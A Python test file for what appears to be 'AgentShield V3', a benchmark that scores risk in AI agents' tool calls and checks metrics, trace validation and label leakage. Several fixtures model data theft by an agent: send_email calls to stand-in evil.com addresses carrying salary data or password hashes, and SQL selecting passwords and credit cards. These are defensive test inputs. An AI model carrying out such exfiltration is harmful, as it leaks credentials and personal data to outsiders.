"""
AgentShield V3 Benchmark Module Tests
======================================
Tests for the benchmark evaluation pipeline:
- Baseline risk scoring functions
- Evaluation metrics computation
- Trace schema validation
- Report generation
"""

import sys
from pathlib import Path

import pytest

_CURRENT_DIR = Path(__file__).parent.resolve()
_BACKEND_DIR = _CURRENT_DIR.parent
ROOT = str(_BACKEND_DIR.parent)
for path in [ROOT]:
    while path in sys.path:
        sys.path.remove(path)
    sys.path.insert(0, path)


# ─── Baseline Risk Scoring Tests ─────────────────────────────────────────────

class TestBaselineRiskScoring:
    """Test the baseline risk scoring functions from benchmark/baselines.py."""

    def test_action_for_score_boundaries(self):
        from benchmark.baselines import action_for_score
        assert action_for_score(0.0) == "ALLOW"
        assert action_for_score(0.59) == "ALLOW"
        assert action_for_score(0.60) == "HUMAN_REVIEW"
        assert action_for_score(0.89) == "HUMAN_REVIEW"
        assert action_for_score(0.90) == "BLOCK"
        assert action_for_score(1.0) == "BLOCK"

    def test_clamp_function(self):
        from benchmark.baselines import clamp
        assert clamp(0.5) == 0.5
        assert clamp(-0.1) == 0.0
        assert clamp(1.5) == 1.0
        assert clamp(0.0) == 0.0
        assert clamp(1.0) == 1.0

    def test_risk_tool_name_basic(self):
        """risk_tool_name returns a score in [0, 1] for various tools."""
        from benchmark.baselines import risk_tool_name
        for tool in ["read_file", "send_email", "cursor.execute", "http_request", "export_csv"]:
            score = risk_tool_name({"tool_name": tool})
            assert 0.0 <= score <= 1.0, f"Score {score} out of range for {tool}"

    def test_risk_content_keyword_sensitive(self):
        """Content with sensitive keywords scores higher than plain content."""
        from benchmark.baselines import risk_content_keyword
        safe = risk_content_keyword({"tool_input": {"path": "/tmp/report.txt"}})
        risky = risk_content_keyword({"tool_input": {"query": "SELECT password FROM users WHERE admin"}})
        assert risky > safe

    def test_category_is_stripped_before_scoring(self):
        """A category field must not reach the scorer.

        ``category`` is label-derived in at least one adapter (the AgentDojo
        loader set it to ``attack_name if label == 1 else "benign"``), so a
        scorer that reads it is reading ground truth. This replaced a test that
        asserted different categories produce different priors -- which
        documented the leak rather than guarding against it.
        """
        from benchmark.baselines import observable_view, risk_local_context

        with_category = {
            "tool_name": "read",
            "tool_input": {},
            "category": "privilege_escalation",
            "attack_name": "direct",
            "label": 1,
        }
        view = observable_view(with_category)
        assert "category" not in view
        assert "attack_name" not in view
        assert "label" not in view

        # Stripping category must not change the score: the prior path is gone.
        assert risk_local_context(with_category) == risk_local_context(view)

    def test_risk_agent_shield_chain_aware(self):
        """AgentShield chain-aware baseline infers chain context from observable data (no label leakage)."""
        from benchmark.baselines import risk_agent_shield
        # Case with collect-stage content (observable: query tool)
        case_collect = {
            "category": "behavior_chain_risk",
            "tool_name": "cursor.execute",
            "tool_input": {"sql": "SELECT * FROM users"},
        }
        # Case with exfiltrate-stage content (observable: send_email + external)
        case_exfiltrate = {
            "category": "behavior_chain_risk",
            "tool_name": "send_email",
            "tool_input": {"to": "external@evil.com", "body": "salary data"},
        }

        score_collect = risk_agent_shield(case_collect)
        score_exfiltrate = risk_agent_shield(case_exfiltrate)
        # Exfiltrate content should score higher than collect
        assert score_exfiltrate >= score_collect

    def test_risk_agent_shield_no_label_leakage(self):
        """risk_agent_shield does NOT read ground-truth fields."""
        from benchmark.baselines import risk_agent_shield
        case = {
            "category": "behavior_chain_risk",
            "tool_name": "cursor.execute",
            "tool_input": {"sql": "SELECT 1"},
        }
        # Score without ground-truth fields
        score_no_labels = risk_agent_shield(case)

        # Score WITH ground-truth fields added (should be identical)
        case_with_labels = dict(case)
        case_with_labels["attack_stage"] = "exfiltrate"
        case_with_labels["chain_id"] = "chain_999"
        case_with_labels["step_index"] = 5
        score_with_labels = risk_agent_shield(case_with_labels)

        # Scores must be equal - no label leakage
        assert score_no_labels == score_with_labels, (
            f"Label leakage detected: {score_no_labels} != {score_with_labels}. "
            "risk_agent_shield() must not read attack_stage, chain_id, or step_index."
        )

    def test_risk_agent_shield_graph_enhanced(self):
        """risk_agent_shield_graph adds graph risk propagation."""
        from benchmark.baselines import risk_agent_shield, risk_agent_shield_graph
        case = {
            "category": "behavior_chain_risk",
            "tool_name": "send_email",
            "tool_input": {"to": "ext@evil.com", "body": "password_hash dump"},
            "agent_id": "test_agent",
        }
        score_base = risk_agent_shield(case)
        score_graph = risk_agent_shield_graph(case)
        # Graph-enhanced should be >= base score
        assert score_graph >= score_base

    def test_risk_llm_as_judge_returns_valid_score(self):
        """LLM-as-Judge baseline returns scores in [0, 1]."""
        from benchmark.baselines import risk_llm_as_judge
        for tool in ["read_file", "send_email", "cursor.execute", "http_request", "export_csv"]:
            case = {
                "tool_name": tool,
                "tool_input": {"query": "SELECT * FROM users"},
                "category": "sensitive_data_access",
            }
            score = risk_llm_as_judge(case)
            assert 0.0 <= score <= 1.0, f"Score {score} out of range for {tool}"

    def test_risk_llm_as_judge_sensitive_data_scores_higher(self):
        """LLM-as-Judge scores sensitive data higher than safe data."""
        from benchmark.baselines import risk_llm_as_judge
        safe = risk_llm_as_judge({
            "tool_name": "read_file",
            "tool_input": {"path": "/tmp/report.txt"},
            "category": "normal",
        })
        risky = risk_llm_as_judge({
            "tool_name": "cursor.execute",
            "tool_input": {"query": "SELECT password, credit_card FROM users"},
            "category": "sensitive_data_access",
        })
        assert risky > safe


# ─── Evaluation Metrics Tests ────────────────────────────────────────────────

class TestEvaluationMetrics:
    """Test the evaluate() function and metric computation."""

    def test_evaluate_returns_required_keys(self):
        """evaluate() returns all required metric keys."""
        from benchmark.baselines import evaluate

        def mock_predictor(case):
            return 0.5

        cases = [
            {"id": "c1", "expected_action": "ALLOW", "expected_risk_score": 0.3},
            {"id": "c2", "expected_action": "BLOCK", "expected_risk_score": 0.9},
        ]
        result = evaluate("test_model", mock_predictor, cases)
        assert "name" in result
        assert "total" in result
        assert "action_accuracy" in result
        assert "macro_f1" in result
        assert "block_recall" in result
        assert "false_allow_rate" in result
        assert "false_block_rate" in result
        assert "per_label" in result
        assert "confusion_matrix" in result

    def test_evaluate_perfect_predictor(self):
        """A perfect predictor achieves 100% accuracy."""
        from benchmark.baselines import evaluate

        cases = [
            {"id": "c1", "expected_action": "ALLOW", "expected_risk_score": 0.3},
            {"id": "c2", "expected_action": "HUMAN_REVIEW", "expected_risk_score": 0.7},
            {"id": "c3", "expected_action": "BLOCK", "expected_risk_score": 0.95},
        ]

        def perfect_predictor(case):
            return float(case["expected_risk_score"])

        result = evaluate("perfect", perfect_predictor, cases)
        assert result["action_accuracy"] == pytest.approx(1.0)
        assert result["macro_f1"] == pytest.approx(1.0)

    def test_evaluate_empty_cases(self):
        """evaluate() handles empty case list gracefully."""
        from benchmark.baselines import evaluate
        result = evaluate("empty", lambda c: 0.5, [])
        assert result["total"] == 0
        assert result["action_accuracy"] == 0.0

    def test_precision_recall_f1_formula(self):
        """precision_recall_f1 computes correct values."""
        from benchmark.baselines import precision_recall_f1
        p, r, f1 = precision_recall_f1(tp=8, fp=2, fn=1)
        assert p == pytest.approx(8 / 10)
        assert r == pytest.approx(8 / 9)
        expected_f1 = 2 * (8 / 10) * (8 / 9) / ((8 / 10) + (8 / 9))
        assert f1 == pytest.approx(expected_f1)

    def test_precision_recall_f1_zero_division(self):
        """precision_recall_f1 handles zero division gracefully."""
        from benchmark.baselines import precision_recall_f1
        p, r, f1 = precision_recall_f1(tp=0, fp=0, fn=0)
        assert p == 0.0
        assert r == 0.0
        assert f1 == 0.0


# ─── Trace Schema Validation Tests ───────────────────────────────────────────

class TestTraceSchemaValidation:
    """Test the trace schema validation from benchmark/trace_schema.py."""

    def test_validate_trace_valid(self):
        from benchmark.trace_schema import validate_trace
        trace = {
            "trace_id": "t_001",
            "scenario_type": "normal_business_query",
            "chain_label": "ALLOW",
            "risk_path": [0],
            "critical_step": 0,
            "expected_intervention_step": -1,
            "source": "controlled_semireal",
            "human_reviewed": True,
            "steps": [
                {
                    "trace_id": "t_001",
                    "session_id": "s_001",
                    "agent_id": "agent_1",
                    "step": 0,
                    "parent_step": None,
                    "tool_name": "read_file",
                    "tool_input": {"path": "/tmp"},
                    "tool_output_summary": "ok",
                    "timestamp": "2026-01-01T00:00:00",
                    "local_risk_type": "safe",
                    "local_risk_score": 0.1,
                    "label": "ALLOW",
                }
            ],
        }
        validate_trace(trace)  # Should not raise

    def test_validate_trace_missing_key(self):
        from benchmark.trace_schema import validate_trace
        trace = {"trace_id": "t_001"}  # Missing many keys
        with pytest.raises(ValueError, match="missing keys"):
            validate_trace(trace)

    def test_validate_trace_invalid_label(self):
        from benchmark.trace_schema import validate_trace
        trace = {
            "trace_id": "t_001",
            "scenario_type": "test",
            "chain_label": "INVALID",
            "risk_path": [0],
            "critical_step": 0,
            "expected_intervention_step": 0,
            "source": "test",
            "human_reviewed": True,
            "steps": [
                {
                    "trace_id": "t_001", "session_id": "s", "agent_id": "a",
                    "step": 0, "parent_step": None, "tool_name": "t",
                    "tool_input": {}, "tool_output_summary": "ok",
                    "timestamp": "2026-01-01", "local_risk_type": "safe",
                    "local_risk_score": 0.1, "label": "ALLOW",
                }
            ],
        }
        with pytest.raises(ValueError, match="Invalid chain label"):
            validate_trace(trace)

    def test_validate_trace_empty_steps(self):
        from benchmark.trace_schema import validate_trace
        trace = {
            "trace_id": "t_001",
            "scenario_type": "test",
            "chain_label": "ALLOW",
            "risk_path": [],
            "critical_step": 0,
            "expected_intervention_step": 0,
            "source": "test",
            "human_reviewed": True,
            "steps": [],
        }
        with pytest.raises(ValueError, match="at least one step"):
            validate_trace(trace)

    def test_validate_trace_score_out_of_range(self):
        from benchmark.trace_schema import validate_trace
        trace = {
            "trace_id": "t_001",
            "scenario_type": "test",
            "chain_label": "ALLOW",
            "risk_path": [0],
            "critical_step": 0,
            "expected_intervention_step": 0,
            "source": "test",
            "human_reviewed": True,
            "steps": [
                {
                    "trace_id": "t_001", "session_id": "s", "agent_id": "a",
                    "step": 0, "parent_step": None, "tool_name": "t",
                    "tool_input": {}, "tool_output_summary": "ok",
                    "timestamp": "2026-01-01", "local_risk_type": "safe",
                    "local_risk_score": 1.5,  # Out of range
                    "label": "ALLOW",
                }
            ],
        }
        with pytest.raises(ValueError, match="between 0 and 1"):
            validate_trace(trace)

    def test_trace_label_enum_values(self):
        from benchmark.trace_schema import TraceLabel
        assert TraceLabel.ALLOW.value == "ALLOW"
        assert TraceLabel.HUMAN_REVIEW.value == "HUMAN_REVIEW"
        assert TraceLabel.BLOCK.value == "BLOCK"


# ─── Semireal Trace-to-Case Tests ────────────────────────────────────────────

class TestTraceToCaseConversion:
    """Test the trace_to_case conversion in evaluate_semireal.py."""

    def test_trace_to_case_basic(self):
        from benchmark.evaluate_semireal import trace_to_case
        trace = {
            "trace_id": "t_001",
            "scenario_type": "normal_business_query",
            "chain_label": "ALLOW",
            "critical_step": 0,
            "steps": [
                {
                    "step": 0,
                    "agent_id": "agent_1",
                    "tool_name": "read_file",
                    "tool_input": {"path": "/tmp"},
                    "local_risk_type": "safe",
                    "local_risk_score": 0.1,
                }
            ],
        }
        case = trace_to_case(trace)
        assert case["id"] == "t_001"
        assert case["expected_action"] == "ALLOW"
        assert case["agent_id"] == "agent_1"
        assert case["tool_name"] == "read_file"
        assert case["v3_specific"] is True
        assert case["semi_realistic_trace"] is True

    def test_trace_to_case_block_label(self):
        from benchmark.evaluate_semireal import trace_to_case
        trace = {
            "trace_id": "t_002",
            "scenario_type": "privilege_escalation",
            "chain_label": "BLOCK",
            "critical_step": 1,
            "steps": [
                {"step": 0, "agent_id": "a", "tool_name": "query", "tool_input": {}, "local_risk_type": "collect", "local_risk_score": 0.3},
                {"step": 1, "agent_id": "a", "tool_name": "send_email", "tool_input": {}, "local_risk_type": "exfiltrate", "local_risk_score": 0.95},
            ],
        }
        case = trace_to_case(trace)
        assert case["expected_action"] == "BLOCK"
        assert case["expected_risk_score"] >= 0.90


# ─── Chain Inference Helper Tests ─────────────────────────────────────────

class TestChainInference:
    """Test the chain inference helper functions that replace ground-truth labels."""

    def test_infer_chain_position_single(self):
        from benchmark.baselines import _infer_chain_position
        assert _infer_chain_position("read_file /tmp/report") == "single"

    def test_infer_chain_position_early(self):
        from benchmark.baselines import _infer_chain_position
        assert _infer_chain_position("cursor.execute SELECT * FROM users") == "early"

    def test_infer_chain_position_late(self):
        from benchmark.baselines import _infer_chain_position
        # Has both collect and exfil signals
        pos = _infer_chain_position("send_email external query database export")
        assert pos == "late"

    def test_infer_attack_stage_single(self):
        from benchmark.baselines import _infer_attack_stage
        assert _infer_attack_stage("read_file /tmp/report") == "single_call"

    def test_infer_attack_stage_collect(self):
        from benchmark.baselines import _infer_attack_stage
        assert _infer_attack_stage("cursor.execute SELECT * FROM users") == "collect"

    def test_infer_attack_stage_exfiltrate(self):
        from benchmark.baselines import _infer_attack_stage
        assert _infer_attack_stage("send_email to external@gmail.com") == "exfiltrate"

    def test_infer_attack_stage_stage(self):
        from benchmark.baselines import _infer_attack_stage
        assert _infer_attack_stage("file_write export archive data") == "stage"


class TestGraphRiskInference:
    """Test the graph risk inference function."""

    def test_infer_graph_risk_returns_float(self):
        from benchmark.baselines import _infer_graph_risk
        case = {
            "category": "sensitive_data_access",
            "tool_name": "cursor.execute",
            "tool_input": {"query": "SELECT * FROM users"},
            "agent_id": "test",
        }
        result = _infer_graph_risk(case)
        assert isinstance(result, float)
        assert 0.0 <= result <= 1.0

    def test_infer_graph_risk_higher_for_exfiltrate(self):
        from benchmark.baselines import _infer_graph_risk
        case_collect = {
            "category": "sensitive_data_access",
            "tool_name": "cursor.execute",
            "tool_input": {"query": "SELECT * FROM users"},
            "agent_id": "test",
        }
        case_exfil = {
            "category": "external_network_transfer",
            "tool_name": "send_email",
            "tool_input": {"to": "ext@evil.com", "body": "password_hash data"},
            "agent_id": "test",
        }
        risk_collect = _infer_graph_risk(case_collect)
        risk_exfil = _infer_graph_risk(case_exfil)
        # Exfiltrate should have higher graph risk
        assert risk_exfil >= risk_collect


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
